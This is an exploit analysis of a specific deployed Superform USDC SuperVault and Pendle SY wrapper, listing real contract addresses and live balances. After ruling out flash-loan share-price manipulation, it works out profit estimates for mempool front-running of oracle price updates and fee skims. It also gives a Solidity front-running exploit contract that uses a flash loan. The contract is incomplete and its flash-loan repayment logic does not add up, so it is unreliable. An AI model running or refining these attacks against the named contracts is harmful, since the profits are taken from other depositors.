# Cross-Layer Exchange Rate Mismatch + Flash Loan PPS Manipulation
## Complete Exploit Analysis for Superform Flagship USDC SuperVault

**Target**: 0x4d654f255d54637112844bd8802b716170904fee
**Date**: 2026-02-04

---

## Executive Summary

After deep investigation, the **direct flash loan PPS manipulation attack is NOT viable** because:
- PPS is **externally provided by oracle**, not calculated from on-chain balances
- Flash loans cannot manipulate the stored PPS value
- Only authorized PPS Oracles can call `forwardPPS()`

However, **three viable attack vectors** were identified:

| Vector | Feasibility | Estimated Profit | Requirements |
|--------|------------|------------------|--------------|
| Oracle Front-Running | HIGH | 0.1-2% per trade | Mempool access |
| Performance Fee Skim Front-Running | MEDIUM | Up to fee % | Mempool access |
| PPS Staleness Arbitrage | MEDIUM | Depends on update frequency | Timing knowledge |

---

## 1. Architecture Recap

```
┌─────────────────────────────────────────────────────────────────┐
│                    VALUE FLOW DIAGRAM                            │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│   User ──USDC──> Pendle SY ──USDC──> SuperVault ──USDC──>       │
│         <──SY──           <─shares─              Strategy       │
│                                                                  │
│   Exchange Rate Flow:                                            │
│   ┌──────────────────────────────────────────────────────────┐   │
│   │ Pendle SY.exchangeRate()                                 │   │
│   │    = SuperVault.convertToAssets(1e18)                    │   │
│   │    = 1e18 * storedPPS / PRECISION                        │   │
│   │                                                          │   │
│   │ storedPPS = Aggregator.getPPS(strategy)                  │   │
│   │    [ORACLE PROVIDED - NOT CALCULATED]                    │   │
│   └──────────────────────────────────────────────────────────┘   │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### Current State (Live Data)

```
SuperVault (0xf6ebea08...1947):
  - totalSupply: 16,247,987.98 shares
  - totalAssets: $16,361,285.20 USDC
  - storedPPS: 1.006973 (1,006,973 in 6 decimals)

Pendle SY (0x4d654f25...0fee):
  - totalSupply: ~889,673 SY tokens
  - exchangeRate: 1.006973e18 (matches SuperVault PPS)

Strategy (0x41a9eb39...f1dd):
  - Manages yield sources
  - PPS from Aggregator (0x10ac0b33...4698)
```

---

## 2. Why Flash Loan Attack Fails

### Attempted Attack Path
```
1. Flash loan 10M USDC
2. Deposit into SuperVault → get shares
3. [HOPED] This would inflate totalSupply and deflate PPS
4. Request redemption at low PPS
5. Repay flash loan
6. When redemption fulfills at recovered PPS → profit
```

### Why It Fails

```solidity
// SuperVault.convertToAssets() - PPS IS NOT CALCULATED
function convertToAssets(uint256 shares) public view override returns (uint256) {
    uint256 currentPPS = _getStoredPPS();  // FROM ORACLE, NOT FORMULA
    return Math.mulDiv(shares, currentPPS, PRECISION, Math.Rounding.Floor);
}

// Strategy.getStoredPPS() - DELEGATED TO AGGREGATOR
function getStoredPPS() public view returns (uint256) {
    return _getSuperVaultAggregator().getPPS(address(this));  // EXTERNAL ORACLE
}
```

**PPS is NOT derived from `totalAssets / totalSupply`** - it's stored in the Aggregator and updated by authorized PPS Oracles via `forwardPPS()`.

Flash loans cannot change the stored PPS value.

---

## 3. Viable Attack Vector #1: Oracle Front-Running

### Mechanism

The PPS Oracle system updates PPS via `forwardPPS()` transactions. These transactions are visible in the mempool before inclusion.

```solidity
// Aggregator.forwardPPS() - VISIBLE IN MEMPOOL
function forwardPPS(ForwardPPSArgs calldata args) external onlyPPSOracle {
    // args.strategies[i], args.ppss[i], args.timestamps[i]
    // NEW PPS VALUES ARE IN PLAINTEXT
}
```

### Attack Sequence

```
T0: Current PPS = 1.006973
T1: Attacker sees forwardPPS() in mempool with newPPS = 1.010000 (+0.3%)
T2: Attacker front-runs with deposit:
    - Deposit 1,000,000 USDC
    - Receives: 1,000,000 * 1e6 / 1,006,973 = 993,074.7 shares
T3: forwardPPS() executes, PPS updates to 1.010000
T4: Attacker's shares are now worth:
    - 993,074.7 * 1.010000 / 1e6 = 1,003,005.4 USDC
T5: Profit = 1,003,005.4 - 1,000,000 - fees - gas = ~$3,000 (0.3%)
```

### Profitability Analysis

```
Let:
  D = deposit amount
  P0 = old PPS
  P1 = new PPS
  f = management fee (bps)
  g = gas cost

Shares received = D * (1 - f/10000) * PRECISION / P0
Value after update = Shares * P1 / PRECISION
Profit = Value - D - g

Profit = D * (1 - f/10000) * P1/P0 - D - g
       = D * [(1 - f/10000) * P1/P0 - 1] - g

For profit > 0:
  (1 - f/10000) * P1/P0 > 1 + g/D
  P1/P0 > (1 + g/D) / (1 - f/10000)

Example with f = 50 bps, g = $50, D = $1M:
  P1/P0 > (1 + 0.00005) / 0.995 = 1.00508

Need PPS increase > 0.508% to profit with $1M deposit
```

### Requirements
- Access to mempool (Flashbots, private RPC, etc.)
- Fast execution infrastructure
- Capital for deposit (can use flash loan for deposit itself)

---

## 4. Viable Attack Vector #2: Performance Fee Skim Front-Running

### Mechanism

When `skimPerformanceFee()` is called, PPS decreases proportionally to the fee extracted.

```solidity
// Strategy.skimPerformanceFee()
function skimPerformanceFee() external {
    uint256 currentPPS = aggregator.getPPS(address(this));
    uint256 profit = Math.mulDiv(ppsGrowth, totalSupplyLocal, PRECISION);
    uint256 fee = Math.mulDiv(profit, feeConfig.performanceFeeBps, BPS_PRECISION);

    // After fee extraction, PPS decreases:
    uint256 ppsReduction = Math.mulDiv(fee, PRECISION, totalSupplyLocal);
    uint256 newPPS = currentPPS - ppsReduction;

    aggregator.updatePPSAfterSkim(newPPS, fee);
}
```

### Attack Sequence

```
T0: Current PPS = 1.010000, HWM = 1.000000
    Profit above HWM = 1% * totalSupply = ~$163,612
    Performance fee (assume 20%) = $32,722
    PPS reduction = 32,722 / 16,247,987 = 0.002014

T1: Manager calls skimPerformanceFee() - VISIBLE IN MEMPOOL

T2: Attacker front-runs with deposit:
    - Deposit 1,000,000 USDC at PPS 1.010000
    - Receives ~985,222 shares

T3: skimPerformanceFee() executes:
    - PPS drops to 1.010000 - 0.002014 = 1.007986
    - Attacker's shares worth: 985,222 * 1.007986 / 1e6 = 993,089 USDC
    - Everyone else's shares dropped by 0.2%

T4: Attacker AVOIDED the fee proportionally
    - Other depositors lost 0.2% from skim
    - Attacker deposited post-profit, pre-skim
    - Net advantage = deposit_amount * fee_reduction_avoided
```

### Profitability

- Depends on fee percentage and frequency of skims
- Profit = avoided_fee_share - management_fee - gas
- Viable for large deposits when significant fees are about to be skimmed

---

## 5. Viable Attack Vector #3: PPS Staleness Arbitrage

### Mechanism

PPS is updated at intervals (`minUpdateInterval`). Between updates, actual yield accrues but PPS stays constant.

```
Timeline:
T0: PPS update to 1.000000, actual value = 1.000000
T1: Yield accrues, actual value = 1.001000, stored PPS = 1.000000
T2: Attacker deposits at stored PPS (gets more shares than deserved)
T3: PPS update to 1.001000
T4: Attacker's shares now reflect true value
```

### Attack Sequence (Requires Timing Knowledge)

```
ASSUMPTIONS:
- minUpdateInterval = 1 hour
- Yield rate = 5% APY = 0.00057% per hour
- Deposit = $1,000,000

T0: PPS just updated to 1.006973
T1: 55 minutes later, actual yield = 1.006973 * 1.0000057 = 1.006979
    Stored PPS still = 1.006973

T2: Deposit $1M:
    Shares = 1,000,000 * 1e6 / 1,006,973 = 993,074.7
    Actual share value = 993,074.7 * 1.006979 / 1e6 = 1,000,006 USDC

T3: Next PPS update reflects accrued yield
    Profit = $6 per million (very small)
```

### Limitation

The yield accrual between PPS updates is typically very small (fractions of a basis point). This attack is only profitable with:
- Very large deposits ($100M+)
- Very infrequent PPS updates
- Very high yield rates

---

## 6. Combined Attack: Oracle Front-Running with Flash Loan Leverage

### Optimal Attack Sequence

```solidity
contract OracleFrontRunExploit {
    IERC20 constant USDC = IERC20(0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48);
    IPendleSY constant SY = IPendleSY(0x4d654f255d54637112844bd8802b716170904fee);
    IFlashLoanProvider constant FLASH = IFlashLoanProvider(...);

    uint256 public targetPPS;
    uint256 public currentPPS;

    // Called by MEV bot when profitable forwardPPS() detected
    function executeExploit(
        uint256 flashAmount,
        uint256 expectedNewPPS,
        uint256 currentPPS_
    ) external {
        require(expectedNewPPS > currentPPS_ * 10050 / 10000, "PPS increase too small");

        targetPPS = expectedNewPPS;
        currentPPS = currentPPS_;

        // Flash loan USDC
        FLASH.flashLoan(address(USDC), flashAmount, "");
    }

    function onFlashLoan(
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata
    ) external returns (bytes32) {
        // 1. Deposit into Pendle SY (which deposits into SuperVault)
        USDC.approve(address(SY), amount);
        uint256 syReceived = SY.deposit(address(this), address(USDC), amount, 0);

        // 2. SY tokens now represent SuperVault shares at old PPS
        // After this tx (and the forwardPPS we front-ran), our shares worth more

        // 3. Can't instantly withdraw (async), so must hold SY tokens
        // Transfer SY to attacker EOA for later redemption
        IERC20(address(SY)).transfer(msg.sender, syReceived);

        // 4. Repay flash loan
        // Note: We're now net short USDC but long SY tokens
        // This requires pre-funding the contract with flash loan fee + gas
        USDC.transfer(msg.sender, amount + fee);

        return keccak256("FlashLoan");
    }
}
```

### Practical Limitations

1. **Can't instantly realize profit**: SuperVault uses async withdrawals
2. **Capital at risk**: Must hold SY tokens until redemption fulfills
3. **Redemption uncertainty**: Manager controls fulfillment timing
4. **Gas war**: Other MEV bots compete for front-running

---

## 7. Economic Analysis

### Attack Viability Matrix

| Attack | Min Profitable Deposit | Min PPS Delta | Holding Period | Capital Risk |
|--------|----------------------|---------------|----------------|--------------|
| Oracle Front-Run | $100K | 0.5% | Days (async) | HIGH |
| Skim Front-Run | $500K | N/A | Days (async) | HIGH |
| Staleness Arb | $10M+ | 0.01%+ | Days (async) | HIGH |

### Why These Attacks Are Limited

1. **Async Withdrawals**: Can't instantly realize profits; must wait for manager to fulfill redemption
2. **PPS Risk During Hold**: While waiting for redemption, PPS could decrease
3. **Fulfillment Risk**: Manager could delay fulfillment, leaving attacker exposed
4. **Slippage**: Large deposits/withdrawals may hit slippage limits
5. **Competition**: Other MEV bots may compete for the same opportunity

---

## 8. Conclusion

### Attack Feasibility Summary

| Vector | Feasibility | Reason |
|--------|-------------|--------|
| Flash Loan PPS Manipulation | **NOT VIABLE** | PPS is oracle-provided, not calculated |
| Oracle Front-Running | **VIABLE but LIMITED** | Async withdrawals prevent instant profit |
| Fee Skim Front-Running | **VIABLE but LIMITED** | Same async limitation |
| PPS Staleness | **MARGINALLY VIABLE** | Very small profits |

### Key Finding

The **async withdrawal system (ERC7540) is the primary defense** against these attacks. Without instant withdrawals, attackers cannot immediately realize arbitrage profits and must bear significant market risk during the redemption waiting period.

### Recommendations for Further Research

1. Analyze manager behavior patterns for fulfillment timing
2. Monitor for DEX liquidity creation for SY tokens
3. Investigate oracle update patterns and predictability
4. Test redemption fulfillment timing under various conditions

---

## 9. Contract Addresses Reference

| Contract | Address |
|----------|---------|
| Pendle SY (Proxy) | 0x4d654f255d54637112844bd8802b716170904fee |
| Pendle SY (Impl) | 0xb9cdea29f7f976ce1a50944f3b6d0569ee88d9c4 |
| SuperVault | 0xf6ebea08a0dfd44825f67fa9963911c81be2a947 |
| Strategy | 0x41a9eb398518d2487301c61d2b33e4e966a9f1dd |
| Aggregator | 0x10ac0b33e1c4501cf3ec1cb1ae51ebfdbd2d4698 |
| Escrow | 0x11c016dfb1745a81587e5e3fa8fc75f5693f427b |
| USDC | 0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48 |

---

*Analysis completed. No critical instant-profit exploit found due to async withdrawal system.*
